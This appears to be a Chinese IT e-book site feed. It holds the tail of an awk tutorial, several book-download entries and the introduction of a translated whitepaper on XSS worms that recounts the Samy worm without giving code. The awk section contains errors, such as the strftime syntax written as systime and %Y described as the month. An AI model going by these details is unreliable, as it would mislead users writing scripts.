&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;toupper( string )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tolower( string )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; print toupper(&amp;quot;test&amp;quot;), tolower(&amp;quot;TEST&amp;quot;) &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;split函数可按给定的分隔符把字符串分割为一个数组。如果分隔符没提供，则按当前FS值进行分割。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;split( string, array, field separator )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;split( string, array )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; split( &amp;quot;20:18:00&amp;quot;, time, &amp;quot;:&amp;quot; ); print time[2] &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上例把时间按冒号分割到time数组内，并显示第二个数组元素18。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;14-8-2-时间函数&quot;&gt;&lt;a href=&quot;#14-8-2-时间函数&quot; class=&quot;headerlink&quot; title=&quot;14.8.2. 时间函数&quot;&gt;&lt;/a&gt;14.8.2. 时间函数&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;systime函数返回从1970年1月1日开始到当前时间(不计闰年)的整秒数。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systime()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; now = systime(); print now &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;strftime函数使用C库中的strftime函数格式化时间。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systime( [format specification][,timestamp] )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;Table 3. 日期和时间格式说明符&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;| 格式 | 描述 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| --- | --- |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %a | 星期几的缩写(Sun) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %A | 星期几的完整写法(Sunday) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %b | 月名的缩写(Oct) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %B | 月名的完整写法(October) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %c | 本地日期和时间 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %d | 十进制日期 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %D | 日期 08/20/99 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %e | 日期，如果只有一位会补上一个空格 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %H | 用十进制表示24小时格式的小时 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %I | 用十进制表示12小时格式的小时 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %j | 从1月1日起一年中的第几天 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %m | 十进制表示的月份 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %M | 十进制表示的分钟 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %p | 12小时表示法(AM/PM) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %S | 十进制表示的秒 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %U | 十进制表示的一年中的第几个星期(星期天作为一个星期的开始) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %w | 十进制表示的星期几(星期天是0) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %W | 十进制表示的一年中的第几个星期(星期一作为一个星期的开始) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %x | 重新设置本地日期(08/20/99) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %X | 重新设置本地时间(12：00：00) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %y | 两位数字表示的年(99) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %Y | 当前月份 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %Z | 时区(PDT) |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| %% | 百分号(%) |&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; now=strftime( &amp;quot;%D&amp;quot;, systime() ); print now &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; now=strftime(&amp;quot;%m/%d/%y&amp;quot;); print now &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;14-8-3-内建数学函数&quot;&gt;&lt;a href=&quot;#14-8-3-内建数学函数&quot; class=&quot;headerlink&quot; title=&quot;14.8.3. 内建数学函数&quot;&gt;&lt;/a&gt;14.8.3. 内建数学函数&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Table 4.&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;函数名称&lt;/th&gt;
&lt;th&gt;返回值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;atan2(x,y)&lt;/td&gt;
&lt;td&gt;y,x范围内的余切&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cos(x)&lt;/td&gt;
&lt;td&gt;余弦函数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;exp(x)&lt;/td&gt;
&lt;td&gt;求幂&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;int(x)&lt;/td&gt;
&lt;td&gt;取整&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;log(x)&lt;/td&gt;
&lt;td&gt;自然对数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rand()&lt;/td&gt;
&lt;td&gt;随机数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sin(x)&lt;/td&gt;
&lt;td&gt;正弦&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sqrt(x)&lt;/td&gt;
&lt;td&gt;平方根&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;srand(x)&lt;/td&gt;
&lt;td&gt;x是rand()函数的种子&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;int(x)&lt;/td&gt;
&lt;td&gt;取整，过程没有舍入&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rand()&lt;/td&gt;
&lt;td&gt;产生一个大于等于0而小于1的随机数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;14-8-4-自定义函数&quot;&gt;&lt;a href=&quot;#14-8-4-自定义函数&quot; class=&quot;headerlink&quot; title=&quot;14.8.4. 自定义函数&quot;&gt;&lt;/a&gt;14.8.4. 自定义函数&lt;/h4&gt;&lt;p&gt;在awk中还可自定义函数，格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;function name ( parameter, parameter, parameter, ... ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                statements&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                return expression                  # the return statement and expression are optional&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;15-How-to&quot;&gt;&lt;a href=&quot;#15-How-to&quot; class=&quot;headerlink&quot; title=&quot;15. How-to&quot;&gt;&lt;/a&gt;15. How-to&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;如何把一行竖排的数据转换成横排？&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;awk &amp;apos;&amp;#123;printf(&amp;quot;%s,&amp;quot;,$1)&amp;#125;&amp;apos; filename&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;整理：Jims of &lt;a href=&quot;http://www.ringkee.com&quot;&gt;肥肥世家&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;mailto:jims.yang@gmail.com&quot;&gt;jims.yang@gmail.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Copyright © 2004 本文遵从GPL协议，欢迎转载、修改、散布。&lt;/p&gt;
&lt;p&gt;第一次发布时间:2004年8月6日&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://it-ebooks.flygon.net/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Python 自然语言处理 中文版</title>
    <link href="http://it-ebooks.flygon.net/python-nlp/"/>
    <id>http://it-ebooks.flygon.net/python-nlp/</id>
    <published>2016-03-12T12:58:15.000Z</published>
    <updated>2016-03-12T13:27:00.417Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;https://img3.doubanio.com/lpic/s27313176.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;翻译：&lt;a href=&quot;http://weibo.com/chentao1999&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;陈涛&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;格式：PDF&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;p&gt;暂无。&lt;/p&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://old.sebug.net/paper/books/python/PYTHON%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E4%B8%AD%E6%96%87%E7%89%88.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Sebug下载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://pan.baidu.com/s/1qW4pvnY&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百度云下载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://vdisk.weibo.com/s/aADaW4YRi_Fxd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;微盘下载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://1000eb.com/1j0t4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;千易下载&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://img3.doubanio.com/lpic/s27313176.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;翻译：&lt;a href=&quot;http://weibo.com/chentao1999&quot;&gt;陈涛&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;格式：PDF&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="nlp" scheme="http://it-ebooks.flygon.net/tags/nlp/"/>
    
  </entry>
  
  <entry>
    <title>Werkzeug 中文文档</title>
    <link href="http://it-ebooks.flygon.net/werkzeug-doc/"/>
    <id>http://it-ebooks.flygon.net/werkzeug-doc/</id>
    <published>2016-03-12T12:56:31.000Z</published>
    <updated>2016-03-12T12:57:48.246Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://box.kancloud.cn/cover_2015-10-16_56206edee066_800x1068.jpg?imageMogr2/thumbnail/173x231!/interlace/1/quality/100&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kancloud.cn/manual/werkzeug&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kancloud.cn/manual/werkzeug&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下载地址&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://box.kancloud.cn/cover_2015-10-16_56206edee066_800x1068.jpg?imageMogr2/thumbnail/173x231!/interlace/1/quality/100&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="werkzurg" scheme="http://it-ebooks.flygon.net/tags/werkzurg/"/>
    
  </entry>
  
  <entry>
    <title>Jinja2 中文文档</title>
    <link href="http://it-ebooks.flygon.net/jinja2-doc/"/>
    <id>http://it-ebooks.flygon.net/jinja2-doc/</id>
    <published>2016-03-12T12:55:32.000Z</published>
    <updated>2016-03-12T12:56:56.053Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://box.kancloud.cn/cover_2015-10-13_561cde52af5b_800x1068.png?imageMogr2/thumbnail/173x231!/interlace/1/quality/100&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kancloud.cn/manual/jinja2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kancloud.cn/manual/jinja2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下载地址&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://box.kancloud.cn/cover_2015-10-13_561cde52af5b_800x1068.png?imageMogr2/thumbnail/173x231!/interlace/1/quality/100&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="jinja2" scheme="http://it-ebooks.flygon.net/tags/jinja2/"/>
    
  </entry>
  
  <entry>
    <title>Python3 Cookbook 中文版</title>
    <link href="http://it-ebooks.flygon.net/python-cookbook/"/>
    <id>http://it-ebooks.flygon.net/python-cookbook/</id>
    <published>2016-03-12T12:05:19.000Z</published>
    <updated>2016-03-12T12:30:08.247Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://box.kancloud.cn/cover_2015-07-29_55b86876708c_800x1068.jpg?imageMogr2/thumbnail/173x231!/interlace/1/quality/100&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;译者：&lt;a href=&quot;https://github.com/yidao620c&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;yidao620c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/yidao620c/python3-cookbook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;python3-cookbook&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kancloud.cn/kancloud/python3-cookbook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kancloud.cn/kancloud/python3-cookbook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下载地址&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://box.kancloud.cn/cover_2015-07-29_55b86876708c_800x1068.jpg?imageMogr2/thumbnail/173x231!/interlace/1/quality/100&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;译者：&lt;a href=&quot;https://github.com/yidao620c&quot;&gt;yidao620c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/yidao620c/python3-cookbook&quot;&gt;python3-cookbook&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>XSS 蠕虫 &amp; 病毒 即将发生的威胁与最好的防御</title>
    <link href="http://it-ebooks.flygon.net/xss-%E8%A0%95%E8%99%AB-%E7%97%85%E6%AF%92-%E5%8D%B3%E5%B0%86%E5%8F%91%E7%94%9F%E7%9A%84%E5%A8%81%E8%83%81%E4%B8%8E%E6%9C%80%E5%A5%BD%E7%9A%84%E9%98%B2%E5%BE%A1/"/>
    <id>http://it-ebooks.flygon.net/xss-蠕虫-病毒-即将发生的威胁与最好的防御/</id>
    <published>2016-03-12T11:53:17.000Z</published>
    <updated>2016-03-12T11:53:47.924Z</updated>
    
    <content type="html">&lt;p&gt;June 2007 – updated Jeremiah Grossman&lt;/p&gt;
&lt;p&gt;Founder and CTO, WhiteHat Security&lt;/p&gt;
&lt;p&gt;翻译：&lt;a href=&quot;http://hi.baidu.com/fooying&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Fooying&lt;/a&gt;（知道创宇安全研究团队）&lt;/p&gt;
&lt;p&gt;2013/1/1&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;2005 年 10 月 14 日, “Samy worm1”成为第一大使用跨站脚本 2(“XSS”)进行传播感染的蠕虫。一夜之间，蠕虫在世 界最流行的社交网站 MySpace.com 上，更改了超过一百万个人用户个人资料页面。该蠕虫通过 JavaScript 病毒性代码 来感染网站，并且添加一个叫 Samy 的黑客为”朋友”和”英雄 3”(译者注:类似于微博关注)。使得 MySpace 这样一个在美 国超过 3200 万用户的、排名前十(根据 ALEXA 排名)的网站被迫关闭以阻止冲击。&lt;/p&gt;
&lt;p&gt;Samy，蠕虫作者，原意只是想要变得更知名,然后这样的一个 payload 也是相对良性的。但是，请想想他拥有和控 制着超过一百万可支配的 Web 浏览器和千兆带宽，他可以做什么——浏览器，也可能登录到谷歌，雅虎，微软 Passport， 易趣，网络银行，股票经纪，博客，留言板，或任何其他的 Web 应用程序。不过重要的是我们开始了解相关的风险 的大小与 XSS 恶意软件的方法和途径，企业可以保护他们自己和他们的用户，尤其是当恶意软件来源于信任的网站和 侵略性的编写者。&lt;/p&gt;
&lt;p&gt;在本白皮书中，我们将提供一个关于 XSS 的概述;定义 XSS 蠕虫;检验传播方式，感染率和潜在的影响。最重要的是，我们将描述如何立即采取措施，企业可以采取以捍卫他们的网站。&lt;/p&gt;
&lt;h1 id=&quot;关于-XSS-蠕虫和病毒的-10-条快速介绍-你现在需要知道的&quot;&gt;&lt;a href=&quot;#关于-XSS-蠕虫和病毒的-10-条快速介绍-你现在需要知道的&quot; class=&quot;headerlink&quot; title=&quot;关于 XSS 蠕虫和病毒的 10 条快速介绍_你现在需要知道的:&quot;&gt;&lt;/a&gt;关于 XSS 蠕虫和病毒的 10 条快速介绍_你现在需要知道的:&lt;/h1&gt;&lt;p&gt;XSS 的爆发：&lt;/p&gt;
&lt;p&gt;1、 可能来自社区驱动的受欢迎的网站的功能，如社交网络，博客，用户评论，留言板，聊天室，网络邮件，和维基 百科。&lt;/p&gt;
&lt;p&gt;2、 可发生于任何时间，因为传播所需的漏洞存在于超过 80%的网站。&lt;/p&gt;
